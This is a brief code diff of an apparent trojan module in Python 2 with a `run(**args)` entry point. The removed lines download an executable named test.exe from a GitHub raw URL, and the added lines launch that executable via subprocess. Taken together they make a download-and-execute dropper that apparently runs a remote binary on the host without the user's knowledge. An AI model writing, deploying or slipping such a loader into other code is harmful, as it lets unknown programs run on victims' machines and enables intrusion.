@@ -1,22 +1,13 @@
-import requests
-
+import subprocess
 def run(**args):
-  try:
-   
-     goodie = "test.exe"
-     url = 'https://github.com/experiment2016/workhub/raw/master/test.exe'
-     r = requests.get(url, stream=True)
+  try:               
+      action = "test.exe"
 
-     with open(goodie, 'wb') as fd:
-         for chunk in r.iter_content(chunk_size=1024):
-             fd.write(chunk)
-     fd.close()
-     te = "ok"
-     return str(te)
-     
+      subprocess.Popen(action)               
+      ta = "ok"
+      return str(ta)
   except Exception, e:
       return str(e)
-
      
 
 
